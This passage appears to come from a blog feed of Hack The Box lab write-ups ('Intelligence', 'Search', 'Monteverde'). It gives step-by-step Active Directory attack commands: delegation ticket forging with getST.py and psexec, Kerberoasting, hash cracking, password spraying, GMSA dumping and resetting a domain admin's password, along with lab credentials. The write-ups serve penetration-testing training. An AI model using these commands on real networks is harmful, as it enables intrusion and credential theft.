<p><em>However, because the</em> <strong>service portion</strong> <em>in the granted</em> <strong>service ticket</strong> <em>is</em> <strong>unprotected</strong>, we may alter it for <strong>any service</strong> we want.</p>

<p><strong>For example:</strong> we can modify the received ticket to be for the <strong>LDAP</strong> service and be granted <strong>DCSync</strong> rights.</p>

<p>It was all mentioned on the <strong>Bloodhound</strong> help</p>

<p><img src="/assets/Intelligence/allowed-to-delegate-bh-help.jpg" alt="allowed-to-delegate-bh-help" /></p>

<p>Let’s go ahead and exploit this! :D</p>

<p>We will first request the ticket using <a href="https://github.com/SecureAuthCorp/impacket"><strong>impacket</strong></a>’s <code class="language-plaintext highlighter-rouge">getST.py</code> script</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getST.py <span class="nt">-dc-ip</span> 10.10.10.248 <span class="nt">-spn</span> <span class="s1">'WWW/dc.intelligence.htb'</span> <span class="nt">-impersonate</span> administrator intelligence.htb/<span class="s1">'svc_int$'</span> <span class="nt">-hashes</span> :6bf735e60852b92212d512a4deadcfea
</code></pre></div></div>

<p><img src="/assets/Intelligence/getting-admin-ticket.jpg" alt="getting-admin-ticket" /></p>

<p>The ticket is now saved to disk. We’re going to export it to our environment and use it to own the box:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>&lt;path/to/ticket&gt;
psexec.py <span class="nt">-k</span> <span class="nt">-no-pass</span> intelligence.htb/administrator@dc.intelligence.htb
</code></pre></div></div>

<p><img src="/assets/Intelligence/box-owned.jpg" alt="box-owned" /></p>

<p>Pretty sweet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Search</title><link href="http://localhost:4000/2022/06/28/Search.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Search" /><published>2022-06-28T00:00:00+02:00</published><updated>2022-06-28T00:00:00+02:00</updated><id>http://localhost:4000/2022/06/28/Search</id><content type="html" xml:base="http://localhost:4000/2022/06/28/Search.html"><![CDATA[<p><img src="/assets/Search/Search.png" alt="Search" /></p>

<h2 id="summary">Summary</h2>
<ul>
  <li>A <strong>Windows Domain Controller</strong> machine where we don’t get any access using conventional methods. The key to gaining our initial set of credentials is by inspecting <em>the images</em> on the website where one turns out to have <strong>credentials</strong> for a user called <code class="language-plaintext highlighter-rouge">hope.sharp</code></li>
  <li><em>Using this authenticated access,</em> we run a <strong>Kerberoast</strong> attack which gets us the hash of the <code class="language-plaintext highlighter-rouge">web_svc</code> account that we crack to get a password.</li>
  <li><em>When spraying this password across the domain users,</em> we find out that the password is also used by another user: <code class="language-plaintext highlighter-rouge">edgar.jacobs</code>.</li>
  <li>Edgar’s shared redirected folder was exposing his user profile which contained an interesting <strong>Microsoft Excel</strong> document called <code class="language-plaintext highlighter-rouge">Phishing_Attempt.xlsx</code>.</li>
  <li><em>When closely checking the contents of that document,</em> we find a <em>hidden</em> column which cannot be viewed because of the protection on the document.</li>
  <li>Uploading the Excel workbook to <strong>Google Sheets</strong> does the trick and shows us the hidden column which turned out to be a set of passwords.</li>
  <li>One of the passwords worked for a user called <code class="language-plaintext highlighter-rouge">sierra.frye</code> which had the permission to read the <strong>GMSA</strong> password of <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code>.</li>
  <li>The account <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> had a <code class="language-plaintext highlighter-rouge">WriteDACL</code> right on a <strong>Domain Administrator</strong> called <code class="language-plaintext highlighter-rouge">tristan.davies</code>.</li>
  <li>We use a python script to retrieve the <strong>NTLM</strong> hash of <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> and abuse his rights to reset the password of <code class="language-plaintext highlighter-rouge">tristan.davies</code> via <strong>RPC.</strong></li>
  <li>Another route that is a bit longer includes using the <strong>PowerShell Web Access</strong> enabled on the web server after cracking then importing into our browser a <code class="language-plaintext highlighter-rouge">.pfx</code> certificate found on the shared user profile of the <code class="language-plaintext highlighter-rouge">sierra.frye</code> user.</li>
</ul>

<hr />

<h2 id="nmap">Nmap</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Search &amp;mdash; Just Testing IIS
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-25 20:46:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
|_http-title: Search &amp;mdash; Just Testing IIS
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Not valid before: 2020-04-07T09:05:25
|_Not valid after:  2030-04-05T09:05:25
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
49736/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-06-25T20:47:44
|_  start_date: N/A
</code></pre></div></div>

<p>We see standard Domain Controller ports (53, 88, 389 &amp; 3269) and <strong>IIS</strong> on ports 80, 443 &amp; 8172</p>

<p>Port 5985 wasn’t open so that meant no <strong>WinRM</strong> for this box</p>

<h2 id="stuff-we-tried-but-didnt-work">Stuff we tried but didn’t work</h2>
<ol>
  <li><strong>SMB</strong> enumeration using anonymous, guest and null sessions.</li>
  <li><strong>RPC</strong> enumeration with <code class="language-plaintext highlighter-rouge">enum4linux-ng</code>.</li>
  <li><strong>LDAP</strong> enumeration with <code class="language-plaintext highlighter-rouge">ldapsearch</code> using anonymous authentication.</li>
  <li>Collecting usernames from the website and trying them. We got 3 valid users. But none of them was <strong>ASREPRoastable</strong> or had a weak password.</li>
  <li>Web Directory Bruteforcing. The only unique directory was <code class="language-plaintext highlighter-rouge">/staff</code> but we got access denied. We also did file bruteforcing with multiple extensions without much success.</li>
  <li>Viewing the source code for the accessible web pages.</li>
  <li>Checking for <strong>Virtual Host Routing</strong>.</li>
</ol>

<p>All of those didn’t yield any results. However..</p>

<h2 id="when-you-use-a-magnifying-glass">When you use a magnifying glass..</h2>
<p><em>when looking really close at one of the images on the website,</em> something is there!</p>

<p><img src="/assets/Search/secret-image-small.jpg" alt="secret-image-small" /></p>

<p>The text was very small. so we had to open up the image in a new tab and zoom in to find what’s written:</p>

<p><img src="/assets/Search/secret-image-up-close.jpg" alt="secret-image-up-close" /></p>

<p>It said: <strong>“Send password to Hope Sharp”</strong> then <strong>“IsolationIsKey?”</strong></p>

<h2 id="first-set-of-credentials">First set of credentials</h2>
<p><em>Earlier,</em> when extracted usernames from the website:</p>

<p><img src="/assets/Search/website-users-2.jpg" alt="website-users" /></p>

<p>we used a python tool called <a href="/assets/Search/https://github.com/w0Tx/generate-ad-username"><code class="language-plaintext highlighter-rouge">ADGenerator</code></a> to generate a list of usernames based on their first and last names following common naming conventions:</p>

<ul>
  <li>NameSurname</li>
  <li>Name.Surname</li>
  <li>NamSur (3letters of each)</li>
  <li>Nam.Sur</li>
  <li>NSurname</li>
  <li>N.Surname</li>
  <li>SurnameName</li>
  <li>Surname.Name</li>
  <li>SurnameN</li>
  <li>Surname.N</li>
</ul>

<p>and we used a tool called <a href="/assets/Search/https://github.com/ropnop/kerbrute"><code class="language-plaintext highlighter-rouge">kerbrute</code></a> to enumerate which were valid users using the <code class="language-plaintext highlighter-rouge">userenum</code> module.</p>

<p><img src="/assets/Search/kerbrute-userenum.jpg" alt="kerbrute-userenum" /></p>

<p><em>From that,</em> we know that the username convention is <strong>Name.Surname</strong></p>

<p>We went ahead and found the password <strong>“IsolationIsKey?”</strong> to work with <strong>“Hope.Sharp”</strong></p>

<p><img src="/assets/Search/auth-as-hope-sharp.jpg" alt="auth-as-hope-sharp" /></p>

<h2 id="the-awesomeness-of-bloodhound">The Awesomeness of BloodHound</h2>
<p><em>Since port 5985 isn’t open,</em> we have no reason to check for <strong>WinRM</strong> capabilities. So we turn to using all the tools that don’t require a foothold on the box.</p>

<p>We start with <a href="/assets/Search/https://github.com/fox-it/BloodHound.py"><code class="language-plaintext highlighter-rouge">BloodHound.py</code></a> to get an overview of the situation in the domain.</p>

<p><strong>Note:</strong> it’s recommended to set your <strong>DNS</strong> server in <code class="language-plaintext highlighter-rouge">/etc/resolv.conf</code> to the box’s IP to make sure things go smoothly when using any of the tools we’re about to use.</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 bloodhound.py <span class="nt">-d</span> search.htb <span class="nt">-dc</span> research.search.htb <span class="nt">-u</span> hope.sharp <span class="nt">-p</span> <span class="s1">'IsolationIsKey?'</span>
</code></pre></div></div>

<p><img src="/assets/Search/bloodhound-py.jpg" alt="bloodhound-py" /></p>

<p><em>When checking the output of the</em> <code class="language-plaintext highlighter-rouge">ShortestPath to High Value Targets</code>, we see a <strong>clear path</strong> to owning the domain:</p>

<p><img src="/assets/Search/clear-path-to-DA.jpg" alt="clear-path-to-DA" /></p>

<p>We would first have to make our way to any of users on the left within the <code class="language-plaintext highlighter-rouge">ITSEC</code> group.</p>

<p><em>In another</em> <code class="language-plaintext highlighter-rouge">BloodHound</code> <em>query for kerberoastable accounts</em>, we find we can attack <code class="language-plaintext highlighter-rouge">WEB_SVC</code>:</p>

<p><img src="/assets/Search/web-svc-kerberoastable.jpg" alt="web-svc-kerberoastable" /></p>

<h2 id="kerberoasting-web_svc">Kerberoasting <code class="language-plaintext highlighter-rouge">web_svc</code></h2>
<p>we use impacket’s <code class="language-plaintext highlighter-rouge">GetUserSPNs.py</code></p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 GetUserSPNs.py <span class="nt">-debug</span> <span class="nt">-request</span> <span class="nt">-dc-ip</span> 10.10.11.129 search.htb/hope.sharp:<span class="s1">'IsolationIsKey?'</span>
</code></pre></div></div>

<p><img src="/assets/Search/kerberoasted.jpg" alt="kerberoasted" /></p>

<p>And we crack the password using <code class="language-plaintext highlighter-rouge">john</code></p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john web_svc_hash <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
</code></pre></div></div>

<p><img src="/assets/Search/cracked-with-john.jpg" alt="cracked-with-john" /></p>

<p>The password was <strong>“@3ONEmillionbaby”</strong></p>

<h2 id="checking-for-password-reuse">Checking for Password Reuse</h2>
<p>It has turned into a habit for me to spray any password I get on all possible users xD</p>

<p><em>In order to get a the full list of domain users,</em> I use <code class="language-plaintext highlighter-rouge">crackmapexec</code> with the <code class="language-plaintext highlighter-rouge">--users</code> flag.</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.129 <span class="nt">-u</span> <span class="s1">'web_svc'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">--users</span>
</code></pre></div></div>

<p><img src="/assets/Search/cme-full-userlist.jpg" alt="cme-full-userlist" /></p>

<p>We find out that another user had been user the same password <strong>“@3ONEmillionbaby”</strong></p>

<p><img src="/assets/Search/edgar-reusing.jpg" alt="edgar-reusing" /></p>

<h2 id="enumerating-smb-access-for-edgar">Enumerating SMB access for Edgar</h2>
<p>We use <code class="language-plaintext highlighter-rouge">crackmapexec</code>’s <code class="language-plaintext highlighter-rouge">spider_plus</code> module to get a <em>nicely-formatted</em> <strong>JSON</strong> output for <code class="language-plaintext highlighter-rouge">edgar</code>’s share access.</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.129 <span class="nt">-u</span> <span class="s1">'Edgar.Jacobs'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">-M</span> spider_plus
</code></pre></div></div>

<p>We notice something interesting in the results:</p>

<p><img src="/assets/Search/interesting-document-found.jpg" alt="interesting-document-found" /></p>

<p>we use <code class="language-plaintext highlighter-rouge">smbclient</code> to fetch the file:</p>

<p><img src="/assets/Search/getting-the-sheet.jpg" alt="getting-the-sheet" /></p>

<p><em>After opening the document with</em> <strong>Microsoft Office’s Excel</strong> <em>and looking into the second tab of the workbook,</em> we notice a hidden column: <strong>C</strong></p>

<p><img src="/assets/Search/hidden-column.jpg" alt="hidden-column" /></p>

<p>We won’t be able to <strong>unhide</strong> this column unless we <strong>unprotect</strong> the sheet:</p>

<p><img src="/assets/Search/unprotecting-sheet.jpg" alt="unprotecting-sheet" /></p>

<p><em>We can, however,</em> use the trick of uploading the <code class="language-plaintext highlighter-rouge">xlsx</code> file to <strong>Google Sheets</strong> :D</p>

<p><img src="/assets/Search/got-them-passwords.jpg" alt="got-them-passwords" /></p>

<p><strong>PROFIT! :D</strong></p>

<h2 id="access-as-sierra">Access as Sierra</h2>
<p><em>When using the obtained passwords throughout the domain,</em> we gain access to <code class="language-plaintext highlighter-rouge">seirra.frye</code></p>

<p><img src="/assets/Search/got-sierra.jpg" alt="got-sierra" /></p>

<p>and since <code class="language-plaintext highlighter-rouge">sierra</code> is a member of the <code class="language-plaintext highlighter-rouge">ITSEC</code> group, we’re going to go for a full domain takeover!</p>

<p><img src="/assets/Search/path-to-da.jpg" alt="path-to-da" /></p>

<h2 id="reading-the-gmsa-password--resetting-tristans-password">Reading the GMSA password &amp; Resetting <code class="language-plaintext highlighter-rouge">tristan</code>’s password</h2>
<p>We can obtain the <strong>NTLM</strong> hash of the <strong>GMSA</strong> <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> with a <strong>python</strong> tool called <a href="/assets/Search/https://github.com/micahvandeusen/gMSADumper"><code class="language-plaintext highlighter-rouge">gMSADumper</code></a></p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 gMSADumper.py <span class="nt">-u</span> Sierra.Frye <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">-d</span> search.htb
</code></pre></div></div>

<p><img src="/assets/Search/got-gmsa-ntlm.jpg" alt="got-gmsa-ntlm" /></p>

<p>What’s left is to reset the password for <code class="language-plaintext highlighter-rouge">tristan</code> which we can do through <code class="language-plaintext highlighter-rouge">rpcclient</code> using the <code class="language-plaintext highlighter-rouge">--pw-nt-hash</code> to pass the hash.</p>

<p>then following with the <code class="language-plaintext highlighter-rouge">setuserinfo2</code> command making sure our password satisfies the complexity requirements.</p>

<p>and finishing with <strong>impacket</strong>’s <code class="language-plaintext highlighter-rouge">wmiexec.py</code> to get full shell access.</p>

<p><img src="/assets/Search/got-tristan.jpg" alt="got-tristan" /></p>

<h2 id="an-alternate-route-cracking-the-pfx-certificate-on-sierras-share--using-it-for-powershell-web-access">An Alternate Route: cracking the <code class="language-plaintext highlighter-rouge">.pfx</code> certificate on <code class="language-plaintext highlighter-rouge">sierra</code>’s share + using it for PowerShell web access</h2>
<p><em>If we take some time to check</em> <code class="language-plaintext highlighter-rouge">sierra</code>’s <em>profile,</em> we see a file called <code class="language-plaintext highlighter-rouge">staff.pfx</code> in the <code class="language-plaintext highlighter-rouge">\Downloads\Backups</code> folder:</p>

<p><img src="/assets/Search/pfx-found.jpg" alt="pfx-found" /></p>

<p>Using <code class="language-plaintext highlighter-rouge">john</code>’s python utility script <code class="language-plaintext highlighter-rouge">pfx2john</code>, we can get a format that’s crackable.</p>

<p><img src="/assets/Search/cracked-pfx.jpg" alt="cracked-pfx" /></p>

<p>We can import these certificates into <code class="language-plaintext highlighter-rouge">firefox</code></p>

<p><img src="/assets/Search/firefox-cert-import.jpg" alt="firefox-cert-import" /></p>

<p><em>After importing the certificates,</em> we can browse to <code class="language-plaintext highlighter-rouge">https://10.10.11.129/staff</code></p>

<p><img src="/assets/Search/powershell-web-access.jpg" alt="powershell-web-access" /></p>

<p>we get a nice web terminal after authenticating:</p>

<p><img src="/assets/Search/powershell-web-terminal.jpg" alt="powershell-web-terminal" /></p>

<p><em>In order to be able to run code as</em> <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA</code>, we’re going to do a couple of things:</p>

<ol>
  <li>Obtain the <strong>GMSA</strong> password as a secure string. This can be done with the below command:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$secstringpassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertFrom-ADManagedPasswordBlob</span><span class="w"> </span><span class="p">(</span><span class="n">get-adserviceaccount</span><span class="w"> </span><span class="nt">-filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">msDS-ManagedPassword</span><span class="p">)</span><span class="o">.</span><span class="s1">'msDS-ManagedPassword'</span><span class="p">)</span><span class="o">.</span><span class="nf">SecureCurrentPassword</span><span class="w">
</span></code></pre></div>    </div>
  </li>
  <li>Create a <code class="language-plaintext highlighter-rouge">PSCredential</code> object with both the <strong>GMSA</strong> username and the secure string.
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="nx">BIR-ADFS-GMSA</span><span class="p">,</span><span class="w"> </span><span class="nv">$secstringpassword</span><span class="w">
</span></code></pre></div>    </div>
  </li>
  <li>Execute a password reset command using the created <code class="language-plaintext highlighter-rouge">PSCredential</code>:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$Script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">Set-ADAccountPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">tristan.davies</span><span class="w"> </span><span class="nt">-reset</span><span class="w"> </span><span class="nt">-NewPassword</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="s1">'H@CKEDAGA1N!!'</span><span class="w"> </span><span class="nt">-force</span><span class="p">)}</span><span class="w">
</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">127.0.0.1</span><span class="w"> </span><span class="nt">-credential</span><span class="w"> </span><span class="nv">$cred</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="nv">$Script</span><span class="w">
</span></code></pre></div>    </div>
  </li>
  <li>Create another <code class="language-plaintext highlighter-rouge">PSCredential</code> object but with <code class="language-plaintext highlighter-rouge">tristan</code>’s new password:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$killercreds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="nx">Tristan.Davies</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="s1">'H@CKEDAGA1N!!'</span><span class="w"> </span><span class="nt">-force</span><span class="p">)</span><span class="w">
</span></code></pre></div>    </div>
  </li>
  <li>Execute commands as <code class="language-plaintext highlighter-rouge">tristan</code> using the new credential object:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">127.0.0.1</span><span class="w"> </span><span class="nt">-credential</span><span class="w"> </span><span class="nv">$killercreds</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="n">whoami</span><span class="p">}</span><span class="w">
</span></code></pre></div>    </div>
  </li>
</ol>

<p><img src="/assets/Search/tristan-web-access.jpg" alt="tristan-web-access" /></p>

<p>And this wraps up the path :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Monteverde</title><link href="http://localhost:4000/2022/06/24/Monteverde.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Monteverde" /><published>2022-06-24T00:00:00+02:00</published><updated>2022-06-24T00:00:00+02:00</updated><id>http://localhost:4000/2022/06/24/Monteverde</id><content type="html" xml:base="http://localhost:4000/2022/06/24/Monteverde.html"><![CDATA[<p><img src="/assets/Monteverde/Monteverde.png" alt="Monteverde" /></p>

<h2 id="summary">Summary</h2>
<ul>
  <li>Another Windows Domain Controller Machine.</li>
  <li>We get a full list of domain users by enumerating <strong>RPC</strong> and are able to login with a user called <code class="language-plaintext highlighter-rouge">SABatchJobs</code> whose password was his own username.</li>
  <li><em>Enumerating the</em> <strong>SMB</strong> <em>access for this user,</em> we find that he could read a certain <strong>XML</strong> file which contained a password.</li>
  <li><em>After spraying the password over all users,</em> it turns out to belong to another user called <code class="language-plaintext highlighter-rouge">mhope</code> who happens to have <strong>PowerShell Remoting</strong> access and who’s a member of the <code class="language-plaintext highlighter-rouge">Azure Admins</code> AD group. Which was interesting.</li>
  <li><em>Additionally,</em> we found a special folder called <code class="language-plaintext highlighter-rouge">.Azure</code> in <code class="language-plaintext highlighter-rouge">mhope</code>’s user profile. It contained remnants of a connection made to <strong>Azure</strong>.</li>
  <li>We also find <code class="language-plaintext highlighter-rouge">Azure AD Connect</code> installed in the <code class="language-plaintext highlighter-rouge">C:\Program Files</code> directory which all stuck out and brought our attention to search for <strong>Privilege Escalation</strong> paths along that way.</li>
  <li><em>Searching</em> <strong>Google</strong> <em>for</em> <code class="language-plaintext highlighter-rouge">Privilege Escalation Using Azure AD Connect</code>, we find a <strong>blog post</strong> that gives us a bit of background on what <code class="language-plaintext highlighter-rouge">Azure AD Connect</code> does and how to exploit it to gain <strong>Domain Admin</strong> privileges.</li>
  <li><em>Since</em> <code class="language-plaintext highlighter-rouge">Azure AD Connect</code> <em>uses an account to sync passwords between the</em> <strong>On-prem Active Directory</strong> <em>and the</em> <strong>Azure Instance</strong>, this account must be granted <code class="language-plaintext highlighter-rouge">DCSync</code> rights for the functionality to work.</li>
  <li>The credentials for this account are stored within the local <strong>MSSQL</strong> database that’s included in the installation of <code class="language-plaintext highlighter-rouge">Azure AD Connect</code>. <em>Even thought they are encrypted,</em> their decryption keys are also present on the same database.</li>
  <li><em>Since our user</em> <code class="language-plaintext highlighter-rouge">mhope</code> <em>had access to that local DB,</em> We were able to extract and decrypt those credentials after doing a few tweaks to the <strong>PowerShell</strong> script provided by the blog author.</li>
  <li>They turn out to be the <strong>Domain Administrator</strong>’s creds and we root the box.</li>
</ul>

<hr />

<h2 id="nmap">Nmap</h2>
<p>No special scan here. Just the standard <code class="language-plaintext highlighter-rouge">nmap</code> with <code class="language-plaintext highlighter-rouge">-sC</code> for default scripts and <code class="language-plaintext highlighter-rouge">-sV</code> for version detection on all ports.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-23 17:15:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-server-header: Microsoft-HTTPAPI/2.0
| http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49747/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-06-23T17:16:47
|_  start_date: N/A
</code></pre></div></div>

<p>We notice it’s a <strong>Windows</strong> box with few ports indicative of a <strong>Domain Controller</strong>: <strong>DNS</strong> on tcp 53, <strong>Kerberos</strong> on tcp 88 and <strong>LDAP</strong> on tcp 389.</p>

<p>The domain name is <strong>MEGABANK.LOCAL</strong> and the hostname is <strong>MONTEVERDE</strong></p>

<p>We also have <strong>WinRM</strong> open on tcp 5985 which would be handy to get remote code execution for any user present in either <strong>Administrators</strong> or <strong>Remote Management Users</strong> local groups.</p>

<h2 id="username-enumeration">Username Enumeration</h2>
<p><em>Using a tool called</em> <code class="language-plaintext highlighter-rouge">enum4linux-ng</code>, we are able to get a list of usernames via <code class="language-plaintext highlighter-rouge">RPC</code>:</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linx-ng <span class="nt">-A</span> 10.10.10.172
</code></pre></div></div>

<p><img src="/assets/Monteverde/enum4linux-ng-output.jpg" alt="enum4linux-ng-output" /></p>

<p>No interesting info was in the description except for one user: <code class="language-plaintext highlighter-rouge">AAD_987d7f2f57d2</code></p>

<p>It said: <code class="language-plaintext highlighter-rouge">Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.</code></p>

<p>This hinted at the possibility that this account might have <strong>DCSync</strong> rights. <em>If that was true,</em> then getting access as that user would mean game over :D</p>

<p>We take note of that and get the <strong>Domain Password Policy</strong> from the output as well.</p>

<p><img src="/assets/Monteverde/password-policy.jpg" alt="password-policy" /></p>

<p><em>With no account lockout configured,</em> we can spray like there’s no tomorrow :D</p>

<h2 id="asreproasting-then-password-spraying">ASREPRoasting then Password Spraying</h2>
<p><em>Since</em> <strong>ASREPRoasting</strong> <em>is the first thing to do with a userlist,</em> we tried it but weren’t awarded with any hashes. So we turned to <strong>Password Spraying</strong>.</p>

<p>We make a quick list of common passwords to try like ‘P@ssw0rd’, ‘Welcome1’ etc. but don’t get anything :/</p>

<p>So we try using the usernames themselves as passwords. We do so using <code class="language-plaintext highlighter-rouge">hydra</code> and we get a hit!</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-e</span> s <span class="nt">-L</span> users.txt ldap3://10.10.10.172 <span class="nt">-v</span>
</code></pre></div></div>

